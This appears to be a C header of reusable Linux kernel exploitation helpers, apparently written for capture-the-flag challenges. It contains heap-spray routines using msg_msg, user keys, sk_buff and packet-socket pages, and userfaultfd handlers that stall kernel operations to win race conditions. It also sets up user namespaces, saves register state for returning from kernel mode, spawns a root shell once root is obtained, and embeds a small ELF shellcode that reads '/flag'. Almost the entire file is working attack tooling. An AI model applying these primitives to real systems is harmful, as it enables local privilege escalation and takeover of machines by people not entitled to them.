/*
 *if use musl-gcc
 *plz comment out the userfaultfd related
*/
/*gcc exp.c -o exp -masm=intel*/
#ifndef BORAD_H
#define BORAD_H


#ifndef _GNU_SOURCE
  #define _GNU_SOURCE 
#endif
#include <arpa/inet.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <keyutils.h>
#include <sys/prctl.h>  
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <linux/genetlink.h>
#include <linux/if_packet.h>
#include <linux/netlink.h>
#include <linux/openvswitch.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sched.h>
#include <stdint.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/netfilter_ipv4/ip_tables.h>
// #define DEBUG 1
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"
#define ELEM_CNT(x) (sizeof(x) / sizeof(x[0]))
#define SYS_SETRESUID_OFFSET (0xd81d0)
#define PREFIX_BUF_LEN (16)
#define logd(fmt, ...) dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)
// #define DEBUG 1
#ifdef DEBUG
#define dbg(...) printf(__VA_ARGS__)
#else
#define dbg(...) do {} while (0)
#endif
#define HEAP_MASK 0xffff000000000000
#define KERNEL_MASK 0xffffffff00000000
void get_root_shell(void)
{
    if(getuid()) {
        loge("Failed to get the root!");
        sleep(5);
        exit(EXIT_FAILURE);
    }

    logi("Successful to get the root.");
    logi("Execve root shell now...");
    
    system("/bin/sh");
    
    /* to exit the process normally, instead of segmentation fault */
    exit(EXIT_SUCCESS);
}
void bind_cpu(int cpu_idx) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu_idx, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set)) {
        die("sched_setaffinity: %m");
    }
}

/* userspace status saver */
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    logi("Status has been saved.");
}
static void adjust_fd_rlimit() {
    struct rlimit rlim;
    rlim.rlim_cur = rlim.rlim_max = 14096;
    if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
        rlim.rlim_cur = rlim.rlim_max = 4096;
        if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
            die("setrlimit(RLIMIT_NOFILE, &rlim): %m");
        }
    }
}
static void adjust_rlimit()
{
    struct rlimit rlim;
    rlim.rlim_cur = rlim.rlim_max = (1L << 63);
    setrlimit(RLIMIT_AS, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 32 << 20;
    setrlimit(RLIMIT_MEMLOCK, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 136 << 20;
    setrlimit(RLIMIT_FSIZE, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 1 << 20;
    setrlimit(RLIMIT_STACK, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 0;
    setrlimit(RLIMIT_CORE, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 0x8000;
	setrlimit(RLIMIT_NPROC, &rlim);
    if (setrlimit(RLIMIT_NOFILE, &rlim) < 0)
    {
        rlim.rlim_cur = rlim.rlim_max = 4096;
        if (setrlimit(RLIMIT_NOFILE, &rlim) < 0)
        {
            die("setrlimit(RLIMIT_NOFILE, &rlim): %m");
        }
    }

    struct rlimit print_limit;
    getrlimit(RLIMIT_NOFILE, &print_limit);
    logd("[RLIMIT_NOFILE] soft limit= 0x%lx \t"
         " hard limit= 0x%lx",
         (long)print_limit.rlim_cur,
         (long)print_limit.rlim_max);
    getrlimit(RLIMIT_AS, &print_limit);
    logd("[RLIMIT_AS] soft limit= 0x%lx \t"
         " hard limit= 0x%lx",
         (long)print_limit.rlim_cur,
         (long)print_limit.rlim_max);
}
void setup_namespace() {
    int fd;
    char buff[0x100];

    uid_t uid = getuid();
    gid_t gid = getgid();

    // strace from `unshare -Ur xxx`
    if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) {
        die("unshare(CLONE_NEWUSER | CLONE_NEWNS): %m");
    }

    if (unshare(CLONE_NEWNET)) {
        die("unshare(CLONE_NEWNET): %m");
    }

    fd = open("/proc/self/setgroups", O_WRONLY);
    snprintf(buff, sizeof(buff), "deny");
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", uid);
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", gid);
    write(fd, buff, strlen(buff));
    close(fd);
}
void do_init() {
    logd("perform initialization");
    bind_cpu(0);
    adjust_rlimit();
}
bool is_kernel_pointer(uint64_t addr)
{
    return ((addr & KERNEL_MASK) == KERNEL_MASK) ? true : false;
}


bool is_heap_pointer(uint64_t addr)
{
    return (((addr & HEAP_MASK) == HEAP_MASK) && !is_kernel_pointer(addr)) ? true : false;
}
void hexdump(char *buf, long size)
{
    for (int i = 0; i < size; i += 8)

        printf("\e[96m\e[1m[+%02x]:\t0x%016lx\e[0m\n", i, *(u_int64_t *)(buf + i));
}
size_t kernel_base = 0xffffffff81000000, kernel_offset = 0;
size_t page_offset_base = 0xffff888000000000, vmemmap_base = 0xffffea0000000000;
size_t init_task, init_nsproxy, init_cred;

size_t direct_map_addr_to_page_addr(size_t direct_map_addr)
{
    size_t page_count;

    page_count = ((direct_map_addr & (~0xfff)) - page_offset_base) / 0x1000;
    
    return vmemmap_base + page_count * 0x40;
}         
struct list_head {
    uint64_t    next;
    uint64_t    prev;
};
         
         
/**
  * - user_key_payload  <= kmalloc-8192 
  *   header size = 0x18
  *   flags = （GFP_KERNEL | __GFP_HARDWALL | __GFP_NOWARN）
 **/
#define KEY_SPEC_PROCESS_KEYRING	-2	/* - key ID for process-specific keyring */
#define KEYCTL_UPDATE			2	/* update a key */
#define KEYCTL_REVOKE			3	/* revoke a key */
#define KEYCTL_UNLINK			9	/* unlink a key from a keyring */
#define KEYCTL_READ			11	/* read a key or keyring's contents */
struct rcu_head
{
    void *next;
    void *func;
};
struct user_key_payload
{
    struct rcu_head rcu;
    unsigned short	datalen;
    char *data[];
};
int key_alloc(char *description, void *payload, size_t plen)
{
    return syscall(__NR_add_key, "user", description, payload, plen, 
                   KEY_SPEC_PROCESS_KEYRING);
}

int key_update(int keyid, void *payload, size_t plen)
{
    return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);
}

int key_read(int keyid, void *buffer, size_t buflen)
{
    return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
}

int key_revoke(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
}

int key_unlink(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);
}
         
         
/**
  * - msgmsg   0x31  <= size <= kmalloc-8192 ；or >= kmalloc-64
  *   header size = 0x30
  *   flags = （GFP_KERNEL_ACCOUNT）
 **/
#ifndef MSG_COPY
#define MSG_COPY 040000
#endif
struct msg_msg {
    struct list_head m_list;
    uint64_t    m_type;
    uint64_t    m_ts;
    uint64_t    next;
    uint64_t    security;
};

struct msg_msgseg {
    uint64_t    next;
};
         
int get_msg_queue(void)
{
    return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
}
int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
}
/**
 * the msgp should be a pointer to the `struct msgbuf`,
 * and the data should be stored in msgbuf.mtext
 */
/*
struct msgbuf {
    long mtype;
    char mtext[0]; // size = spraysize - msg_msg(0x30)
};
*/
int write_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    ((struct msgbuf*)msgp)->mtype = msgtyp;
    return msgsnd(msqid, msgp, msgsz, 0);
}

/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */
int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 
                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}

void build_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev, 
              uint64_t m_type, uint64_t m_ts,  uint64_t next, uint64_t security)
{
    msg->m_list.next = m_list_next;
    msg->m_list.prev = m_list_prev;
    msg->m_type = m_type;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = security;
}
/**
 * sk_buff 
 * sk_buff's tail is with a 320-bytes skb_shared_info ; size >= kmalloc-512
 */
#define SOCKET_NUM 8
#define SK_BUFF_NUM 128

/**
 * socket's definition should be like:
 * int sk_sockets[SOCKET_NUM][2];
 */

int init_socket_array(int sk_socket[SOCKET_NUM][2])
{
    /* socket pairs to spray sk_buff */
    for (int i = 0; i < SOCKET_NUM; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket[i]) < 0) {
            die("failed to create no.%d socket pair! %m", i);
        }
    }

    return 0;
}

int spray_sk_buff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
{
    for (int i = 0; i < SOCKET_NUM; i++) {
        for (int j = 0; j < SK_BUFF_NUM; j++) {
            if (write(sk_socket[i][0], buf, size) < 0) {
                die("failed to spray %d sk_buff for %d socket! %m", j, i);
            }
        }
    }

    return 0;
}

int free_sk_buff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
{
    for (int i = 0; i < SOCKET_NUM; i++) {
        for (int j = 0; j < SK_BUFF_NUM; j++) {
            if (read(sk_socket[i][1], buf, size) < 0) {
                die("failed to received sk_buff! %m");
            }
        }
    }

    return 0;
}

         
#define UFFD_API ((uint64_t)0xAA)
#define _UFFDIO_REGISTER		(0x00)
#define _UFFDIO_COPY			(0x03)
#define _UFFDIO_API			(0x3F)

/**
  * - page_fengshui related
 **/
#define PGV_PAGE_NUM 1000
/*
struct tpacket_req {
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};
*/
/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */
struct pgv_page_request {
    int idx;
    int cmd;
    unsigned int size;
    unsigned int nr;
};

enum {
    CMD_ALLOC_PAGE,
    CMD_FREE_PAGE,
    CMD_EXIT,
};

int cmd_pipe_req[2], cmd_pipe_reply[2];

/* create an isolate namespace for pgv */
void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}

/* create a socket and alloc pages, return the socket fd */
int create_socket_and_alloc_pages(unsigned int size, unsigned int nr)
{
    struct tpacket_req req;
    int socket_fd, version;
    int ret;

    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socket_fd < 0) {
        die("failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET) %m");
        ret = socket_fd;
        goto err_out;
    }

    version = TPACKET_V1;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, 
                     &version, sizeof(version));
    if (ret < 0) {
        die("failed at setsockopt(PACKET_VERSION) %m");
        goto err_setsockopt;
    }

    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = nr;
    req.tp_frame_size = 0x1000;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    if (ret < 0) {
        die("failed at setsockopt(PACKET_TX_RING) %m");
        goto err_setsockopt;
    }

    return socket_fd;

err_setsockopt:
    close(socket_fd);
err_out:
    return ret;
}

/* parent call it to send command of allocation to child */
/* size is page_num * 0x1000 */
int alloc_page(int idx, unsigned int size, unsigned int nr)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_ALLOC_PAGE,
        .size = size,
        .nr = nr,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(struct pgv_page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

/* parent call it to send command of freeing to child */
int free_page(int idx)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_FREE_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(req));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

/* child thread's handler for commands from the pipe */
void spray_cmd_handler(void)
{
    struct pgv_page_request req;
    int socket_fd[PGV_PAGE_NUM];
    int ret;

    /* create an isolate namespace*/
    unshare_setup();

    /* handler request */
    do {
        read(cmd_pipe_req[0], &req, sizeof(req));

        if (req.cmd == CMD_ALLOC_PAGE) {
            ret = create_socket_and_alloc_pages(req.size, req.nr);
            socket_fd[req.idx] = ret;
        } else if (req.cmd == CMD_FREE_PAGE) {
            ret = close(socket_fd[req.idx]);
        } else {
            logw("invalid request: %d\n", req.cmd);
        }

        write(cmd_pipe_reply[1], &ret, sizeof(ret));
    } while (req.cmd != CMD_EXIT);
}
         
         
         
         
         
/**
  * - userfaultfd related
 **/
/**
 * The MUSL also doesn't contain `userfaultfd.h` :( 
 * Luckily we just need a bit of micros in exploitation, 
 * so just define them directly is okay :)
 */

#define UFFD_API ((uint64_t)0xAA)
#define _UFFDIO_REGISTER		(0x00)
#define _UFFDIO_COPY			(0x03)
#define _UFFDIO_API			(0x3F)

/* userfaultfd ioctl ids */
#define UFFDIO 0xAA
#define UFFDIO_API		_IOWR(UFFDIO, _UFFDIO_API,	\
				      struct uffdio_api)
#define UFFDIO_REGISTER		_IOWR(UFFDIO, _UFFDIO_REGISTER, \
				      struct uffdio_register)
#define UFFDIO_COPY		_IOWR(UFFDIO, _UFFDIO_COPY,	\
				      struct uffdio_copy)

/* read() structure */
struct uffd_msg {
	uint8_t	event;

	uint8_t	reserved1;
	uint16_t	reserved2;
	uint32_t	reserved3;

	union {
		struct {
			uint64_t	flags;
			uint64_t	address;
			union {
				uint32_t ptid;
			} feat;
		} pagefault;

		struct {
			uint32_t	ufd;
		} fork;

		struct {
			uint64_t	from;
			uint64_t	to;
			uint64_t	len;
		} remap;

		struct {
			uint64_t	start;
			uint64_t	end;
		} remove;

		struct {
			/* unused reserved fields */
			uint64_t	reserved1;
			uint64_t	reserved2;
			uint64_t	reserved3;
		} reserved;
	} arg;
} __attribute__((packed));

#define UFFD_EVENT_PAGEFAULT	0x12

struct uffdio_api {
    uint64_t api;
    uint64_t features;
    uint64_t ioctls;
};

struct uffdio_range {
    uint64_t start;
    uint64_t len;
};

struct uffdio_register {
	struct uffdio_range range;
#define UFFDIO_REGISTER_MODE_MISSING	((uint64_t)1<<0)
#define UFFDIO_REGISTER_MODE_WP		((uint64_t)1<<1)
    uint64_t mode;
    uint64_t ioctls;
};


struct uffdio_copy {
	uint64_t dst;
	uint64_t src;
	uint64_t len;
#define UFFDIO_COPY_MODE_DONTWAKE		((uint64_t)1<<0)
	uint64_t mode;
	int64_t copy;
};

//#include <linux/userfaultfd.h>

char temp_page_for_stuck[0x1000];

void register_userfaultfd(pthread_t *monitor_thread, void *addr,
                          unsigned long len, void *(*handler)(void*))
{
    long uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    /* Create and enable userfaultfd object */
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1) {
        die("userfaultfd %m");
    }

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) {
        die("ioctl-UFFDIO_API %m");
    }

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) {
        die("ioctl-UFFDIO_REGISTER %m");
    }

    s = pthread_create(monitor_thread, NULL, handler, (void *) uffd);
    if (s != 0) {
        die("pthread_create %m");
    }
}

void *uffd_handler_for_stucking_thread(void *args)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) args;

    for (;;) {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1) {
            die("poll %m");
        }

        nread = read(uffd, &msg, sizeof(msg));

        /* just stuck there is okay... */
        sleep(100000000);

        if (nread == 0) {
            die("EOF on userfaultfd! %m");
        }

        if (nread == -1) {
            die("read %m");
        }

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            die("Unexpected event on userfaultfd %m");
        }

        uffdio_copy.src = (unsigned long long) temp_page_for_stuck;
        uffdio_copy.dst = (unsigned long long) msg.arg.pagefault.address &
                                                    ~(0x1000 - 1);
        uffdio_copy.len = 0x1000;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) {
            die("ioctl-UFFDIO_COPY %m");
        }

        return NULL;
    }
}

void register_userfaultfd_for_thread_stucking(pthread_t *monitor_thread, 
                                          void *buf, unsigned long len)
{
    register_userfaultfd(monitor_thread, buf, len, 
                         uffd_handler_for_stucking_thread);
}

struct file;
struct file_operations;
struct tty_struct;
struct tty_driver;
struct serial_icounter_struct;
struct ktermios;
struct termiox;
struct seq_operations;

struct seq_file {
	char *buf;
	size_t size;
	size_t from;
	size_t count;
	size_t pad_until;
	loff_t index;
	loff_t read_pos;
	uint64_t lock[4]; //struct mutex lock;
	const struct seq_operations *op;
	int poll_event;
	const struct file *file;
	void *private;
};

struct seq_operations {
	void * (*start) (struct seq_file *m, loff_t *pos);
	void (*stop) (struct seq_file *m, void *v);
	void * (*next) (struct seq_file *m, void *v, loff_t *pos);
	int (*show) (struct seq_file *m, void *v);
};

struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
            struct file *filp, int idx);
    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int  (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int  (*write)(struct tty_struct * tty,
              const unsigned char *buf, int count);
    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int  (*write_room)(struct tty_struct *tty);
    int  (*chars_in_buffer)(struct tty_struct *tty);
    int  (*ioctl)(struct tty_struct *tty,
            unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
                 unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
            unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty,
                struct serial_icounter_struct *icount);
    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
    int (*poll_init)(struct tty_driver *driver, int line, char *options);
    int (*poll_get_char)(struct tty_driver *driver, int line);
    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
    const struct file_operations *proc_fops;
};

struct page;
struct pipe_inode_info;
struct pipe_buf_operations;

/* read start from len to offset, write start from offset */
struct pipe_buffer {
	struct page *page;
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};

struct pipe_buf_operations {
	/*
	 * ->confirm() verifies that the data in the pipe buffer is there
	 * and that the contents are good. If the pages in the pipe belong
	 * to a file system, we may need to wait for IO completion in this
	 * hook. Returns 0 for good, or a negative error value in case of
	 * error.  If not present all pages are considered good.
	 */
	int (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);

	/*
	 * When the contents of this pipe buffer has been completely
	 * consumed by a reader, ->release() is called.
	 */
	void (*release)(struct pipe_inode_info *, struct pipe_buffer *);

	/*
	 * Attempt to take ownership of the pipe buffer and its contents.
	 * ->try_steal() returns %true for success, in which case the contents
	 * of the pipe (the buf->page) is locked and now completely owned by the
	 * caller. The page may then be transferred to a different mapping, the
	 * most often used case is insertion into different file address space
	 * cache.
	 */
	int (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);

	/*
	 * Get a reference to the pipe buffer.
	 */
	int (*get)(struct pipe_inode_info *, struct pipe_buffer *);
};

         
 unsigned char orw_elfcode[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0xbf, 0x2f, 0x66, 0x6c, 0x61, 0x67, 0x00, 0x00, 0x00, 0x57, 0x48, 
    0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x48, 0x83, 0xc0, 0x02,
    0x0f, 0x05, 0x89, 0xc7, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc2, 0x00, 0x01, 
    0x00, 0x00, 0x48, 0x31, 0xc0, 0x0f, 0x05, 0xb8, 0x01, 0x00, 0x00, 0x00,
    0xbf, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x00,
 };
 /* 
  * open("/flag",0,0)
  * read
  * write
 */
#endif
